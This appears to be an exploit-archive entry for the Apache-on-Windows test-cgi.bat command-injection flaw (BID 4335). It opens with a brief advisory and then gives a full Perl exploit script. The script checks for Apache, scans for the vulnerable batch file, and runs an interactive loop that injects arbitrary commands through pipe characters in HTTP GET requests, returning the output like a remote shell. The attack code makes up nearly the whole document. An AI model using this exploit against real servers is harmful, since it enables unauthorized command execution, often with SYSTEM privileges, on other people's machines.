source: http://www.securityfocus.com/bid/4335/info

Special characters (such as |) may not be filtered by the batch file handler when a web request is made for a batch file. As a result, a remote attacker may be able to execute arbitrary commands on the host running the vulnerable software.

It should be noted that webservers on Windows operating systems normally run with SYSTEM privileges.

The 2.0.x series of Apache for Microsoft Windows ships with a test batch file which may be exploited to execute arbitrary commands. Since this issue is in the batch file handler, any batch file which is accessible via the web is appropriate for the purposes of exploitation. 

##########################################################
# http://www.securityfocus.com/bid/4335
# http://www.securityfocus.com/bid/2023
# www.spabam.org spabam.tk spabam.da.ru go.to/spabam
# Spawn bash style Shell with webserver uid
#
# Spabam 2003 PRIV8 code
# #hackarena irc.brasnet.org
# This Script is currently under development
#####################################################

use strict;
use IO::Socket;
my $host;
my $port;
my $command;
my $url;
my @results;
my $probe;
my @U;
my $shiz;
$U[1] = "/cgi-bin/test-cgi.bat?|";
$shiz = "|";
&intro;
&scan;
&choose;
&command;
&exit;
sub intro {
&help;
&host;
&server;
};
sub host {
print "\nHost or IP : ";
$host=<STDIN>;
chomp $host;
if ($host eq ""){$host="127.0.0.1"};
print "\nPort (enter to accept 80): ";
$port=<STDIN>;
chomp $port;
if ($port =~/\D/ ){$port="80"};
if ($port eq "" ) {$port = "80"};
};
sub server {
my $X;
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
$probe = "string";
my $output;
my $webserver = "something";
&connect;
for ($X=0; $X<=10; $X++){
        $output = $results[$X];
        if (defined $output){
        if ($output =~/Apache/){ $webserver = "apache" };
        };
};
if ($webserver ne "apache"){
my $choice = "y";
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK";
        };
};
sub scan {
my $status = "not_vulnerable";
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) {
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
                              $status = "vulnerable";
                              };
        };
if ($flag eq "0") {
}else{
     };
};
if ($status eq "not_vulnerable"){

                                };
};
sub choose {
my $choice="1";
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
};
sub other {
my $other = "/cgi-bin/test-cgi.bat?|";
chomp $other;
$U[0] = $other;
};
sub command {
while ($command !~/quit/i) {
print "\nHELP QUIT URL SCAN Or Command

\n[$host]\$ ";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose };
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g;
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};
sub connect {
my $connection = IO::Socket::INET->new (
                                Proto => "tcp",
                                PeerAddr => "$host",
                                PeerPort => "$port",
                                ) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command$shiz HTTP/1.1\r\nHost: $host\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.1\r\nHost: $host\r\n\r\n";
};

while ( <$connection> ) {
                        @results = <$connection>;
                         };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};
sub output{
print "\nOUTPUT FROM $host. \n\n";
my $display;
if ($probe eq "string") {
                        my $X;
                        for ($X=0; $X<=10; $X++) {
                        $display = $results[$X];
                        if (defined $display){print "$display";};
                                                        };
                        }else{
                        foreach $display (@results){
                            print "$display";
                                                            };
                          };
};
sub exit{
print "\n\n\n



ANDREA SPABAM 2002.";
print "\nspabam.da.ru spabam\@go.to";
print "\n\n\n";
exit;
};
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n
        test-cgi.bat WindowZ 32 Apache vulnerability
        Command Execution Exploit v2.6 by SPABAM 2003

http://www.securityfocus.com/bid/4335
" ;
print "\n
";
print "\n Apache Win32 1.3.6 win32 - Apache 2.0.34 -BETA win32
";
print "\n
note: WebFolder normally on C:\\Programmi\\Apache Group\\Apache\\htdocs";
print "\n";
print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
print "\n Command: SCAN URL HELP QUIT";
print "\n\n\n\n\n\n\n\n\n\n\n";
};

